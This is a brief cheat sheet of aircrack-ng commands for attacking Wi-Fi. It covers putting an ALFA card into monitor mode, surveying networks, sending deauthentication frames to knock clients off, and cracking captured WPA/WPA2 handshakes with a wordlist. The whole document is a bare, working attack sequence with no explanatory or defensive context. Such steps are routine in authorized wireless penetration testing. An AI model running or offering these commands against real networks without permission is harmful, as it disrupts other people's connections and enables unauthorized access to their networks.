## Setting Up ALFA Card to be in monitor mode
```
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
iwconfig
```
### or
```
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
iwconfig
```

## WPA/WPA2 Cracking
### Broad Survey
```
sudo airodump-ng --band abg <interface>
```
### Targeted Survey
```
sudo airodump-ng –bssid <bssid> –channel <#> -w <filename> <interface>
```
### Deauth
```
sudo aireplay-ng -0 <#> -a <bssid> -c <client MAC> <interface>
```
### Crack WPA2 Password
```
sudo aircrack-ng -w <dictionary file> <capture file> 
```
